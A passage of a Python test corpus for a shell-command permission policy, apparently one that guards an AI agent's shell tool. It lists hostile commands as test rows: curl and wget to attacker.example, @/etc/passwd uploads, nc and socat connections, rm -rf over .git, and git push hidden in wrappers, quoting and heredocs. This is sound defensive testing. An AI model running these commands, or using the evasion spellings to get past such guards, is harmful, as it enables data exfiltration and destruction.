    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "tracked content")
    bare = repo / "backup.git"
    bare.mkdir()
    _git(bare, "init", "-q", "--bare")
    hashed = subprocess.run(
        ["git", "--git-dir", str(bare), "hash-object", "-w", "--stdin"],
        input="secret commit content\n",
        capture_output=True,
        text=True,
        check=True,
    )
    oid = hashed.stdout.strip()
    assert oid == _BARE_NESTED_OBJECT, oid
    assert (bare / "objects" / oid[:2] / oid[2:]).is_file()
    (repo / "link").symlink_to(bare, target_is_directory=True)


def build_curl_destination_fixtures(root: Path) -> None:
    """Build the symlinked --output-dir fixture the R11 permission rows
    resolve against (deep-review round 5).

    A git-clean repository holding a ``safe/`` directory whose ``alias``
    entry is a symlink to the repository's own ``.git`` and whose ``escape``
    entry is a symlink to the sibling ``plain-repo`` fixture (outside this
    repository's workspace), plus an in-workspace ``allowed.txt`` the -F
    read rows name. The recorded observations name no commit hashes,
    branches, or absolute paths, so the build is replay-stable.
    """
    repo = root / "curl-output-dir"
    repo.mkdir(parents=True)
    _git(repo, "init", "-q")
    _git(repo, "config", "user.email", "corpus@example.com")
    _git(repo, "config", "user.name", "Corpus")
    (repo / "tracked.txt").write_text("tracked\n", encoding="utf-8")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "tracked content")
    safe = repo / "safe"
    safe.mkdir()
    (repo / "allowed.txt").write_text("allowed\n", encoding="utf-8")
    os.symlink("../.git", safe / "alias")
    os.symlink("../../plain-repo", safe / "escape")


# ---------------------------------------------------------------------------
# Family observers (shared verbatim by the recorder and the replay)
# ---------------------------------------------------------------------------


def observe_policy(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """Full ``ShellCommandPolicy`` asdict of ``analyze_shell_command_policy``."""
    argv = [str(token) for token in entry["argv"]]
    return {
        "policy": call_json(lambda: policy.analyze_shell_command_policy(list(argv)))
    }


def observe_paths(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """``path_candidates`` order, with and without ``inspect_executable``."""
    argv = [str(token) for token in entry["argv"]]
    return {
        "candidates": call_json(
            lambda: policy.path_candidates(list(argv), inspect_positional_paths=True)
        ),
        "candidates_executable": call_json(
            lambda: policy.path_candidates(
                list(argv), inspect_positional_paths=True, inspect_executable=True
            )
        ),
    }


def observe_git_pure(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """Canonical command, routing flags, and the full classification asdict."""
    argv = [str(token) for token in entry["argv"]]
    return {
        "canonical": call_json(lambda: policy.canonical_git_command(list(argv))),
        "is_dangerous": call_json(
            lambda: policy.is_dangerous_git_subcommand(list(argv))
        ),
        "tree_writing": call_json(
            lambda: policy.git_work_tree_writing_subcommand(list(argv))
        ),
        "classification": call_json(
            lambda: policy.classify_dangerous_git_command(list(argv))
        ),
    }


def observe_executor(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """``executor_boundary`` asdict (or exception) for one admission mode."""
    argv = [str(token) for token in entry["argv"]]
    admission = bool(entry["admission"])
    return {
        "boundary": call_json(
            lambda: policy.executor_boundary(list(argv), admission=admission)
        )
    }


def observe_executor_aux(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """Executor token projection helpers for one argv."""
    argv = [str(token) for token in entry["argv"]]
    return {
        "owned": call_json(lambda: policy.executor_owned_tokens(list(argv))),
        "is_package": call_json(lambda: policy.is_package_command(list(argv))),
        "package_indexes": call_json(
            lambda: sorted(policy.package_argument_indexes(list(argv)))
        ),
        "inline_switch": call_json(
            lambda: policy.inline_interpreter_switch(list(argv))
        ),
    }


def observe_argv_helpers(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """The W3a argv normalization helpers on one token/argument vector."""
    kind = entry["call"]
    if kind == "command_name":
        return {"command_name": call_json(lambda: policy._command_name(entry["token"]))}
    if kind == "options_before_double_dash":
        return {
            "options": call_json(
                lambda: policy._options_before_double_dash([
                    str(token) for token in entry["args"]
                ])
            )
        }
    if kind == "matches_command_prefix":
        return {
            "matches": call_json(
                lambda: policy.matches_command_prefix(
                    [str(token) for token in entry["tokens"]],
                    [str(token) for token in entry["pattern"]],
                )
            )
        }
    raise AssertionError(f"unknown argv helper call: {kind}")


def observe_registry(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """The full EXECUTOR_REGISTRY: sorted families plus every grammar asdict."""
    return {
        "families": sorted(policy.EXECUTOR_REGISTRY),
        "grammars": {
            name: to_jsonable(policy.EXECUTOR_REGISTRY[name])
            for name in sorted(policy.EXECUTOR_REGISTRY)
        },
    }


def observe_git_inspection(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """Repository-inspection outputs for one argv against the fixture tree."""
    argv = [str(token) for token in entry["argv"]]
    cwd = root / str(entry["cwd"])
    relocation = build_relocation(entry.get("relocation"))

    def resolve_scope() -> Any:
        return policy.resolve_repository_scope(cwd, relocation)

    def remotes() -> Any:
        scope = resolve_scope()
        if scope is None:
            return None
        names = policy.git_configured_remote_names(scope)
        return None if names is None else sorted(names)

    return {
        "scope": call_json(lambda: scope_json(resolve_scope(), root)),
        "metadata_paths": call_json(
            lambda: (
                None
                if (paths := policy.git_metadata_paths(argv, cwd=cwd)) is None
                else rel_paths(paths, root)
            )
        ),
        "work_tree": call_json(
            lambda: (
                None
                if (path := policy.resolve_git_work_tree(argv, cwd)) is None
                else rel_path(path, root)
            )
        ),
        "cwd_relocations": call_json(
            lambda: (
                None
                if (paths := policy.git_cwd_relocations(argv, {cwd})) is None
                else rel_paths(paths, root)
            )
        ),
        "config_risk": call_json(
            lambda: policy.git_repository_config_risk(argv, cwd=cwd)
        ),
        "remote_names": call_json(remotes),
    }


def observe_push_risk(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """``git_push_destination_risk`` for one literal modeled push call."""
    cwd = root / str(entry["cwd"])
    relocation = build_relocation(entry.get("relocation"))
    spec = entry["call"]
    call = ModeledGitCall(
        subcommand=str(spec["subcommand"]),
        options=tuple(str(option) for option in spec["options"]),
        option_values=tuple(
            (str(name), str(value)) for name, value in spec["option_values"]
        ),
        operands=tuple(str(operand) for operand in spec["operands"]),
    )

    def run() -> Any:
        scope = policy.resolve_repository_scope(cwd, relocation)
        if scope is None:
            return None
        risk = policy.git_push_destination_risk(call, scope)
        if risk is None:
            return None
        return risk.replace(str(root), FIXTURES_TOKEN)

    return {"push_risk": call_json(run)}


def observe_divergence(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """The pinned deliberate divergences, observed end to end in one entry."""
    argv = [str(token) for token in entry["argv"]]
    return {
        "policy": call_json(lambda: policy.analyze_shell_command_policy(list(argv))),
        "candidates": call_json(
            lambda: policy.path_candidates(list(argv), inspect_positional_paths=True)
        ),
        "canonical": call_json(lambda: policy.canonical_git_command(list(argv))),
        "is_dangerous": call_json(
            lambda: policy.is_dangerous_git_subcommand(list(argv))
        ),
        "tree_writing": call_json(
            lambda: policy.git_work_tree_writing_subcommand(list(argv))
        ),
        "classification": call_json(
            lambda: policy.classify_dangerous_git_command(list(argv))
        ),
    }


PERMISSION_ARGV: list[list[str]] = [
    # sg -c acceptance pins (v0.5.9 P1-e1): the payload is
    # re-analyzed through the wrapper instead of resolving unanalyzed.
    ["sg", "docker", "-c", "git reset --hard"],
    ["sg", "docker", "-c", "git push"],
    ["sg", "docker", "-c", "git status"],
    ["sg", "-c", "echo hi"],
    ["sg", "docker", "bash", "-c", "x"],
    ["sg", "docker", "git", "status"],
    ["sg", "docker"],
    ["sg"],
    ["sg", "docker", "-c"],
    ["sg", "docker", "-c-x"],
    # v0.5.9 P1-e2: probed egress clients and the watch repeater, denied
    # fail-closed by the shipped denylist until each is modeled.
    ["ssh", "host", "git push"],
    ["watch", "-n", "1", "git", "push"],
    ["scp", "file", "host:backup"],
    ["rsync", "-a", "src/", "host:dst/"],
    ["ftp", "host"],
    ["telnet", "host"],
    ["http", "GET", "https://example.com"],
    ["httpie", "GET", "https://example.com"],
    ["wget2", "http://example.com"],
    ["aria2c", "http://example.com"],
    ["lftp", "host:backup"],
    # v0.5.9 P1-e3 wrapper-class audit closure: one row per audited entry.
    # Modeled transparent wrappers verified to re-analyze their payloads
    # (denied git.push below) and to admit safe payloads as run-class.
    ["nice", "git", "push"],
    ["env", "git", "push"],
    ["stdbuf", "-o0", "git", "push"],
    ["flock", "/tmp/l", "git", "push"],
    ["setsid", "git", "push"],
    ["timeout", "5", "git", "push"],
    ["nohup", "git", "push"],
    ["ionice", "-c2", "git", "push"],
    ["taskset", "-c", "0", "git", "push"],
    ["time", "git", "push"],
    ["nice", "echo", "hi"],
    ["nohup", "echo", "hi"],
    # Fail-closed without a denylist entry: a modeled boundary refuses
    # the form, or the payload-holding rule denies it.
    ["xargs", "git", "push"],
    ["find", ".", "-name", "f", "-exec", "git", "push", ";"],
    ["script", "-qc", "git push", "/dev/null"],
    # v0.5.9 P2-d: sudo -u is a transparent wrapper, so this row's
    # wrapped git push re-analyzes to the ask-class dangerous command
    # (the sensitive-prefix denial it recorded before P2-d).
    ["sudo", "-u", "nobody", "git", "push"],
    # Denylisted group/namespace wrappers (fail-closed until modeled).
    ["su", "nobody", "-c", "git push"],
    ["chroot", "/srv", "git", "push"],
    ["unshare", "--fork", "git", "push"],
    ["nsenter", "-t", "1", "git", "push"],
    ["parallel", "git", "push", ":::", "a"],
    # Denylisted build runners: a target runs arbitrary commands.
    ["make", "push"],
    ["rake", "push"],
    ["just", "push"],
    ["ninja"],
    ["cmake", "--build", "."],
    ["gradle", "build"],
    ["mvn", "package"],
    ["ant"],
    ["scons"],
    ["meson", "compile", "-C", "."],
    # Denylisted container runners: the image entrypoint or exec payload
    # runs arbitrary commands.
    ["docker", "run", "img", "git", "push"],
    ["docker", "exec", "c", "git", "push"],
    ["docker", "compose", "up"],
    ["podman", "run", "img", "git", "push"],
    ["podman", "exec", "c", "git", "push"],
    ["kubectl", "run", "p", "--image=img", "--", "git", "push"],
    ["kubectl", "exec", "p", "--", "git", "push"],
    # Denylisted schedulers: scripts installed for later execution.
    ["at", "now"],
    ["batch"],
    ["systemd-run", "git", "push"],
    ["crontab", "-l"],
    # Repeater: watch is pinned above (P1-e2); entr runs on file change.
    ["entr", "git", "push", "/f"],
    # Egress clients probed by the audit, denied fail-closed.
    ["sftp", "host:backup"],
    ["mosh", "host"],
    ["gh", "api", "/user"],
    ["curlie", "GET", "http://attacker.example/"],
    ["xh", "GET", "http://attacker.example/"],
    ["httpx", "http://attacker.example/"],
    ["tftp", "host", "-c", "get f.txt"],
    ["fetch", "http://attacker.example/"],
    ["openssl", "s_client", "-connect", "attacker.example:443"],
    ["openssl", "s_server", "-accept", "4433"],
    # Pre-existing denylist egress clients, pinned for audit closure.
    ["nc", "host", "1234"],
    ["ncat", "host", "1234"],
    ["socat", "TCP:host:1234", "-"],
    # v0.5.9 P2-a destination-aware egress rule: the modeled network
    # clients (curl, wget) left the shipped denylist — destinations decide.
    # Literal loopback (localhost, 127.0.0.0/8, ::1) resolves run-class.
    ["curl", "http://localhost:8080/pubstatus"],
    ["curl", "http://127.0.0.1:8080/pubstatus"],
    ["curl", "http://[::1]:8080/"],
    ["curl", "-d", "@-", "http://localhost:8080/pubstatus"],
    # The redirect-disabled wget form resolves run-class.
    ["wget", "--max-redirect=0", "http://localhost:8080/pubstatus"],
    # (a) redirect-following flags, (b) wget's default, (c)
    # destination-overriding options: ask-class with a literal loopback
    # input so only the behavior gate can produce the ask.
    ["curl", "-L", "http://localhost:8080/pubstatus"],
    ["wget", "http://localhost:8080/pubstatus"],
    ["curl", "--resolve", "localhost:80:203.0.113.1", "http://localhost/"],
    # Non-loopback and unparseable destinations resolve ask-class
    # (network.egress), fail-closed — never loopback.
    ["curl", "https://attacker.example/"],
    ["wget", "http://attacker.example/"],
    ["curl", "localhost:8080/pubstatus"],
    ["curl", "-d", "@-", "https://attacker.example/"],
    # Modeled wrappers compose: the payload's destination decides.
    ["nice", "curl", "http://localhost:8080/pubstatus"],
    ["nice", "curl", "https://attacker.example/"],
    # Git-protocol egress is run-class by client (exfiltration decision
    # item 4), not denylisted: the modeled git client carries it.
    ["git", "clone", "https://attacker.example/x.git"],
    ["git", "fetch", "origin"],
    ["git", "pull"],
    # Package installs are run-class by client as well.
    ["pip", "install", "requests"],
    ["uv", "pip", "install", "requests"],
]

# v0.5.9 P2-c: recursive-rm operand analysis over the git-state fixtures
# built by build_recursive_rm_fixtures. Each entry names the fixture
# directory (relative to the fixture root) the call resolves in. The rows
# pair clean/unsaved fixtures per the saved/unsaved split; the positives
# are metadata-excluding and recovery-established.
PERMISSION_CWD_CASES: list[dict[str, Any]] = [
    # Run-class: a git-clean tree, every operand in-repository,
    # metadata-excluding, recovery established.
    {"argv": ["rm", "-rf", "build"], "cwd": "rm-clean"},
    {"argv": ["rm", "-rf", "build", "tracked.txt"], "cwd": "rm-clean"},
    # An ignored nested repository whose commits are pushed: recovery
    # established even though the operand destroys its Git directory.
    {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-pushed"},
    # Handoff: unsaved work in the assessed tree.
    {"argv": ["rm", "-rf", "build"], "cwd": "rm-unsaved"},
    # Handoff: a rebase in progress (recovery unestablishable).
    {"argv": ["rm", "-rf", "build"], "cwd": "rm-rebase"},
    # Handoff: the operand encompasses the repository's .git.
    {"argv": ["rm", "-rf", "."], "cwd": "rm-clean"},
    # Handoff: a Git-metadata subpath.
    {"argv": ["rm", "-rf", ".git/refs"], "cwd": "rm-clean"},
    # Handoff: mixed operands — an eligible one alongside an ineligible one.
    {"argv": ["rm", "-rf", "build", ".git/refs"], "cwd": "rm-clean"},
    # Handoff: the operand lies outside the assessed repository.
    {"argv": ["rm", "-rf", "../rm-clean"], "cwd": "rm-unsaved"},
    # Handoff: an ignored nested repository with unpushed commits.
    {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-unpushed"},
    # Handoff: a linked-worktree common-directory subpath.
    {"argv": ["rm", "-rf", "../rm-linked/.git/refs"], "cwd": "rm-linked-wt"},
    # Handoff: the work-tree .git marker is metadata too.
    {"argv": ["rm", "-rf", "."], "cwd": "rm-linked-wt"},
]

# v0.5.9 P2-d: sudo -u transparent-wrapper and symbolic-ref mode rows.
# Iterated AFTER PERMISSION_CWD_CASES so the P2-c recursive-rm row ids
# keep theirs; appending to PERMISSION_ARGV would renumber them.
PERMISSION_P2D_ARGV: list[list[str]] = [
    # sudo -u is a transparent wrapper — the wrapped command is
    # re-analyzed (run-class and ask-class payloads), and every other
    # sudo form fails closed.
    ["sudo", "-u", "nobody", "git", "status"],
    ["sudo", "-u", "nobody", "git", "push"],
    ["sudo", "ls"],
    ["sudo", "-i"],
    ["sudo", "-u", "nobody"],
    ["sudo", "git", "status"],
    # symbolic-ref's read mode resolves run-class like a reader; the
    # write forms stay denied (non-run-class).
    ["git", "symbolic-ref", "HEAD"],
    ["git", "symbolic-ref", "-q", "HEAD"],
    ["git", "symbolic-ref", "HEAD", "refs/heads/main"],
    ["git", "symbolic-ref", "-m", "reason", "HEAD", "refs/heads/main"],
    ["git", "symbolic-ref", "-d", "HEAD"],
]

# v0.5.9 P3-a: benign audit dispositions and hidden-form pins. Iterated
# LAST so every earlier permission id keeps its value. Rows carry an
# optional "raw" command string for spellings shlex.join cannot express
# (double-quoted payloads, command substitution, heredocs); "argv" stays
# the token-level view the schema check pins.
PERMISSION_P3A_CASES: list[dict[str, Any]] = [
    # Benign audit friction rows resolving run-class: the VIRTUAL_ENV
    # assignment prefix (removed from DANGEROUS_ENV_NAMES in P2-g) and
    # argument-carrying workspace-venv interpreter invocations (P2-f).
    {"argv": ["VIRTUAL_ENV=.venv", "git", "status"]},
    {"argv": [".venv/bin/python", "--version"]},
    # Retained gates: the bare-interpreter denial, the absolute
    # redirection-target gate, and the workspace-roots floor. The paired
    # in-workspace redirect shows the gate is target-scoped, not blanket.
    {"argv": [".venv/bin/python"]},
    {"argv": ["echo", "hi", ">", "/tmp/out.txt"], "raw": "echo hi > /tmp/out.txt"},
    {"argv": ["echo", "hi", ">", "out.txt"], "raw": "echo hi > out.txt"},
    {"argv": ["cat", "/etc/hostname"]},
    # Hidden forms stay denied fail-closed: command substitution carrying
    # git push, a heredoc-fed sh, and the double-quoted sg payload
    # resolving through the modeled wrapper to the git.push ask-class
    # proposal (the single-quoted spelling is pinned at the matrix top).
    {"argv": ["$(git", "push)"], "raw": "$(git push)"},
    {"argv": ["sh", "<<EOF", "git push", "EOF"], "raw": "sh <<EOF\ngit push\nEOF"},
    {"argv": ["sg", "docker", "-c", "git push"], "raw": 'sg docker -c "git push"'},
]


# v0.5.9 P3-b: the git-class recognition matrix. Each adversarial payload
# class — push (ask-class), reset --hard and clean -fd (hard-guard) —
# probed across quoting, -C relocation, pipes, command lists, and
# modeled-wrapper spellings not already pinned above. Iterated LAST, after
# P3-a, so every earlier permission id keeps its value.
PERMISSION_P3B_CASES: list[dict[str, Any]] = [
    # Quoting: fully and partially quoted words must not change the class
    # (deterministic quote removal); quoted flags on the hard-guard
    # subcommands stay denied fail-closed.
    {"argv": ["git", "push"], "raw": 'git "push"'},
    {"argv": ["git", "push"], "raw": 'git pu"sh"'},
    {"argv": ["git", "push", "origin", "main"], "raw": 'git push "origin" "main"'},
    {"argv": ["git", "push"], "raw": '"git" push'},
    {"argv": ["git", "reset", "--hard"], "raw": 'git "reset" --hard'},
    {"argv": ["git", "reset", "--hard"], "raw": 'git reset "--hard"'},
    {"argv": ["git", "clean", "-fd"], "raw": 'git "clean" -fd'},
    {"argv": ["git", "clean", "-fd"], "raw": 'git clean "-fd"'},
    # -C relocation to fixture-internal targets keeps the payload class;
    # the dangling -C divergence stays pinned in the divergence family.
    {"argv": ["git", "-C", "rm-clean", "push"]},
    {"argv": ["git", "-C", "rm-clean", "reset", "--hard"]},
    {"argv": ["git", "-C", "rm-clean", "clean", "-fd"]},
    {"argv": ["git", "-C", ".", "push"]},
    # Pipes and command lists: the git segment decides the class.
    {"argv": ["echo", "hi", "|", "git", "push"], "raw": "echo hi | git push"},
    {
        "argv": ["echo", "hi", "|", "git", "reset", "--hard"],
        "raw": "echo hi | git reset --hard",
    },
    {
        "argv": ["echo", "hi", "|", "git", "clean", "-fd"],
        "raw": "echo hi | git clean -fd",
    },
    {"argv": ["git", "status;", "git", "push"], "raw": "git status; git push"},
    {
        "argv": ["git", "status;", "git", "reset", "--hard"],
        "raw": "git status; git reset --hard",
    },
    {
        "argv": ["git", "status;", "git", "clean", "-fd"],
        "raw": "git status; git clean -fd",
    },
    {"argv": ["cd", "rm-clean", "&&", "git", "push"], "raw": "cd rm-clean && git push"},
    {"argv": ["git", "status", "||", "git", "push"], "raw": "git status || git push"},
    # Modeled wrappers at spellings not already pinned: options and
    # arguments before the payload, the sudo long form, and an sg payload
    # carrying its own arguments.
    {"argv": ["nice", "-n", "1", "git", "push"]},
    {"argv": ["env", "FOO=1", "git", "push"]},
    {"argv": ["timeout", "30", "git", "push"]},
    {"argv": ["sudo", "--user", "nobody", "git", "push"]},
    {"argv": ["sudo", "-u", "nobody", "git", "reset", "--hard"]},
    {
        "argv": ["sg", "docker", "-c", "git push origin main"],
        "raw": 'sg docker -c "git push origin main"',
    },
]


# v0.5.9 P3-b2: the sg -c payload spelled UNQUOTED, spanning several argv
# tokens. The boundary joins the trailing tokens into the shell source, so
# every unquoted spelling of a gated payload resolves exactly like its
# quoted form (pinned at 0128 and 0154); before the fix these degraded to
# the bare first word and resolved run-class. Iterated LAST, after P3-b,
# so every earlier permission id keeps its value.
PERMISSION_P3B2_CASES: list[dict[str, Any]] = [
    {"argv": ["sg", "docker", "-c", "git", "push"], "raw": "sg docker -c git push"},
    {
        "argv": ["sg", "docker", "-c", "git", "reset", "--hard"],
        "raw": "sg docker -c git reset --hard",
    },
    {
        "argv": ["sg", "docker", "-c", "git", "push", "origin", "main"],
        "raw": "sg docker -c git push origin main",
    },
]


# v0.5.9 P3-c: the recursive-rm form-composition matrix. The P2-c paired
# fixtures (rm-clean vs rm-unsaved) probed across quoting, pipes, command
# lists, and modeled wrappers: every composed form must resolve exactly like
# the plain spelling it wraps — run-class on the clean tree under the full
# P2-c condition, the shipped recursive-rm hard denial on the unsaved tree.
# The metadata rows recompose each P2-c handoff case through two forms. The
# fail-closed rows resolve over the rm-norepo and rm-corrupt fixtures built
# above. Iterated LAST, after P3-b2, so every earlier permission id keeps
# its value.
PERMISSION_P3C_CASES: list[dict[str, Any]] = [
    # Run-class positives: quoting, pipes, command lists, and modeled
    # wrappers over the clean fixture.
    {"argv": ["rm", "-rf", "build"], "raw": 'rm "-rf" build', "cwd": "rm-clean"},
    {
        "argv": ["echo", "hi", "|", "rm", "-rf", "build"],
        "raw": "echo hi | rm -rf build",
        "cwd": "rm-clean",
    },
    {
        "argv": ["git", "status;", "rm", "-rf", "build"],
        "raw": "git status; rm -rf build",
        "cwd": "rm-clean",
    },
    {"argv": ["nice", "rm", "-rf", "build"], "cwd": "rm-clean"},
    {"argv": ["env", "FOO=1", "rm", "-rf", "build"], "cwd": "rm-clean"},
    {"argv": ["sudo", "-u", "nobody", "rm", "-rf", "build"], "cwd": "rm-clean"},
    {
        "argv": ["sg", "docker", "-c", "rm -rf build"],
        "raw": 'sg docker -c "rm -rf build"',
        "cwd": "rm-clean",
    },
    {
        "argv": ["sg", "docker", "-c", "rm", "-rf", "build"],
        "raw": "sg docker -c rm -rf build",
        "cwd": "rm-clean",
    },
    # The same forms over the unsaved fixture: the shipped hard denial.
    {"argv": ["rm", "-rf", "build"], "raw": 'rm "-rf" build', "cwd": "rm-unsaved"},
    {
        "argv": ["echo", "hi", "|", "rm", "-rf", "build"],
        "raw": "echo hi | rm -rf build",
        "cwd": "rm-unsaved",
    },
    {
        "argv": ["git", "status;", "rm", "-rf", "build"],
        "raw": "git status; rm -rf build",
        "cwd": "rm-unsaved",
    },
    {"argv": ["nice", "rm", "-rf", "build"], "cwd": "rm-unsaved"},
    {"argv": ["env", "FOO=1", "rm", "-rf", "build"], "cwd": "rm-unsaved"},
    {"argv": ["sudo", "-u", "nobody", "rm", "-rf", "build"], "cwd": "rm-unsaved"},
    {
        "argv": ["sg", "docker", "-c", "rm -rf build"],
        "raw": 'sg docker -c "rm -rf build"',
        "cwd": "rm-unsaved",
    },
    {
        "argv": ["sg", "docker", "-c", "rm", "-rf", "build"],
        "raw": "sg docker -c rm -rf build",
        "cwd": "rm-unsaved",
    },
    # Metadata overlap through two forms each: the .git-encompassing
    # operand, a Git-metadata subpath, a linked-worktree common directory,
    # an ignored nested repository with unestablished recovery, mixed
    # operands, and an operand outside the assessed repository.
    {"argv": ["rm", "-rf", "."], "raw": 'rm -rf "."', "cwd": "rm-clean"},
    {
        "argv": ["echo", "hi", "|", "rm", "-rf", "."],
        "raw": "echo hi | rm -rf .",
        "cwd": "rm-clean",
    },
    {
        "argv": ["rm", "-rf", ".git/refs"],
        "raw": 'rm "-rf" .git/refs',
        "cwd": "rm-clean",
    },
    {
        "argv": ["git", "status;", "rm", "-rf", ".git/refs"],
        "raw": "git status; rm -rf .git/refs",
        "cwd": "rm-clean",
    },
    {
        "argv": ["rm", "-rf", "../rm-linked/.git/refs"],
        "raw": 'rm -rf "../rm-linked/.git/refs"',
        "cwd": "rm-linked-wt",
    },
    {
        "argv": ["env", "FOO=1", "rm", "-rf", "../rm-linked/.git/refs"],
        "cwd": "rm-linked-wt",
    },
    {
        "argv": ["rm", "-rf", "vendor"],
        "raw": 'rm "-rf" vendor',
        "cwd": "rm-nested-unpushed",
    },
    {
        "argv": ["echo", "hi", "|", "rm", "-rf", "vendor"],
        "raw": "echo hi | rm -rf vendor",
        "cwd": "rm-nested-unpushed",
    },
    {
        "argv": ["rm", "-rf", "build", ".git/refs"],
        "raw": 'rm "-rf" build .git/refs',
        "cwd": "rm-clean",
    },
    {"argv": ["nice", "rm", "-rf", "build", ".git/refs"], "cwd": "rm-clean"},
    {
        "argv": ["rm", "-rf", "../rm-clean"],
        "raw": 'rm -rf "../rm-clean"',
        "cwd": "rm-unsaved",
    },
    {"argv": ["sudo", "-u", "nobody", "rm", "-rf", "../rm-clean"], "cwd": "rm-unsaved"},
    # Fail-closed git-state rows: a directory governed by no repository and
    # a repository whose corrupted .git makes every git state probe exit
    # nonzero both resolve the shipped hard denial.
    {"argv": ["rm", "-rf", "build"], "cwd": "rm-norepo"},
    {
        "argv": ["echo", "hi", "|", "rm", "-rf", "build"],
        "raw": "echo hi | rm -rf build",
        "cwd": "rm-norepo",
    },
    {"argv": ["rm", "-rf", "build"], "cwd": "rm-corrupt"},
    {"argv": ["rm", "-rf", "build"], "raw": 'rm "-rf" build', "cwd": "rm-corrupt"},
]

# v0.5.9 R1: the egress option-table hardening matrix. The ungated
# destination-changing options (unix sockets, the Alt-Svc cache, the
# --follow redirect flag) resolve ask with a literal loopback input, the
# mid-token @file read operands are path-inspected, the inet_aton loopback
# shorthand spellings resolve run-class, and the ambiguous or unrecognized
# loopback-adjacent spellings stay pinned ask (fail-closed, never loopback).
PERMISSION_R1_CASES: list[dict[str, Any]] = [
    # (c) destination-overriding options now gated: a unix(abstract) socket
    # IS the connection destination; the Alt-Svc cache can select another
    # connection destination.
    {"argv": ["curl", "--unix-socket", "/var/run/docker.sock", "http://localhost/"]},
    {"argv": ["curl", "--abstract-unix-socket", "@dockersock", "http://localhost/"]},
    {"argv": ["curl", "--alt-svc", "cache.txt", "http://localhost/"]},
    # (a) the --follow redirect flag (curl 8.16.0) follows redirects like
    # -L/--location.
    {"argv": ["curl", "--follow", "http://localhost/"]},
    # The mid-token @file read operands are path-inspected: an absolute
    # operand outside the workspace is denied even with a loopback URL.
    {"argv": ["curl", "--data-urlencode", "payload@/etc/passwd", "http://localhost/"]},
    {"argv": ["curl", "--header", "@/etc/passwd", "http://localhost/"]},
    # The newly recognized loopback spellings resolve run-class.
    {"argv": ["curl", "http://127.1:8080/pubstatus"]},
    {"argv": ["curl", "http://127.000.000.001:8080/pubstatus"]},
    {"argv": ["curl", "http://0.0.0.0:8080/pubstatus"]},
    {"argv": ["curl", "http://0:8080/pubstatus"]},
    {"argv": ["curl", "http://localhost.:8080/pubstatus"]},
    # Ambiguous or unrecognized loopback-adjacent spellings stay pinned
    # ask (fail-closed, never loopback).
    {"argv": ["curl", "http://0177.0.0.1:8080/pubstatus"]},
    {"argv": ["curl", "http://127.0x1:8080/pubstatus"]},
    {"argv": ["curl", "http://127.0.0.999:8080/pubstatus"]},
    {"argv": ["curl", "http://127:8080/pubstatus"]},
]


# v0.5.9 R4: the egress environment and option-table closure matrix. The
# command line's OWN proxy assignments (command prefix, env wrapper, and
# nested shells included) are part of the connection destination, recursive
# wget retrieval is a destination-changing behavior, a redirect-disable
# spelling re-arms under a later non-zero --max-redirect, the short -H
# header and --form/--json @file operands are path-inspected, and wget's
# rejected-log write is floor-gated. Rows append after R1; ids continue.
PERMISSION_R2_CASES: list[dict[str, Any]] = [
    {"argv": ["ALL_PROXY=http://attacker.example:3128", "curl", "http://localhost/"]},
    {"argv": ["ALL_PROXY=http://attacker.example:3128", "wget", "http://localhost/"]},
    {
        "argv": [
            "env",
            "ALL_PROXY=http://attacker.example:3128",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "bash",
            "-c",
            "ALL_PROXY=http://attacker.example:3128 curl http://localhost/",
        ]
    },
    {"argv": ["HTTPS_PROXY=http://127.0.0.1:3128", "curl", "http://localhost/"]},
    {"argv": ["env", "ALL_PROXY=http://127.0.0.1:3128", "curl", "http://localhost/"]},
    {"argv": ["FTP_PROXY=http://attacker.example:3128", "curl", "ftp://localhost/"]},
    {"argv": ["curl", "-H", "@/etc/passwd", "http://localhost/"]},
    {"argv": ["curl", "--form", "name=@/etc/passwd", "http://localhost/"]},
    {"argv": ["curl", "--json", "@/etc/passwd", "http://localhost/"]},
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "--rejected-log",
            "/tmp/wget-rejected.csv",
            "http://localhost/",
        ]
    },
    {"argv": ["wget", "--max-redirect=0", "-r", "http://localhost/"]},
    {"argv": ["wget", "--max-redirect=0", "--recursive", "http://localhost/"]},
    {"argv": ["wget", "--max-redirect=0", "-m", "http://localhost/"]},
    {"argv": ["wget", "--max-redirect=0", "-r", "-H", "http://localhost/"]},
    {"argv": ["wget", "--max-redirect=0", "--max-redirect=20", "http://localhost/"]},
    {"argv": ["wget", "--max-redirect=0", "--proxy", "on", "http://localhost/"]},
    {"argv": ["wget", "--max-redirect=0", "-Y", "on", "http://localhost/"]},
    {"argv": ["wget", "--max-redirect=0", "-l", "3", "http://localhost/"]},
]


# v0.5.9 R3 (deep review round 3): the wrapper-recursion assignment matrix.
# The resolver's wrapper re-visit now threads the wrapper part's accumulated
# assignments — the statement-level bindings in force where the wrapper runs
# and the wrapper's own command-prefix assignments — into the wrapped
# command, and a nested shell's payload parts inherit the enclosing
# statement's bindings, so a proxy assignment established at or before ANY
# modeled wrapper boundary gates the egress proxy inspection exactly as the
# unwrapped form does. Rows append after R2; ids continue.
PERMISSION_R3_CASES: list[dict[str, Any]] = [
    # An env operand survives each modeled argv wrapper into the client.
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "nice",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "nohup",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "timeout",
            "5",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
            "stdbuf",
            "-oL",
            "curl",
            "http://localhost/",
        ]
    },
    {
        "argv": [
            "env",
            "HTTPS_PROXY=http://attacker.example:3128",
